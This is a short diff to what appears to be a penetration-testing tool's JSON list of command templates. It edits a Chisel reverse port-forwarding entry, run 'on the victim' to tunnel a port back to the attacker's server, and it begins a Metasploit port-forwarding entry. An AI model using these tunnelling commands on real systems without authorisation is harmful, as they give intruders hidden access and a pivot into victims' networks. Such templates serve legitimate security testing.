@@ -8,7 +8,7 @@
   {
     "title": "Chisel Reverse Port Forwarding (Client - Victim)",
     "description": "Connect from the victim machine to the attacker's server and expose a remote port to the attacker's machine.",
-    "template": ".\\chisel.exe client $ATTACKER_IP:$ATTACKER_PORT R:$REMOTE_PORT:localhost:$LOCAL_PORT"
+    "template": ".\\chisel.exe client {local_ip}:$ATTACKER_PORT R:$REMOTE_PORT:localhost:$LOCAL_PORT"
   },
   {
     "title": "Metasploit Port Forwarding - Add",
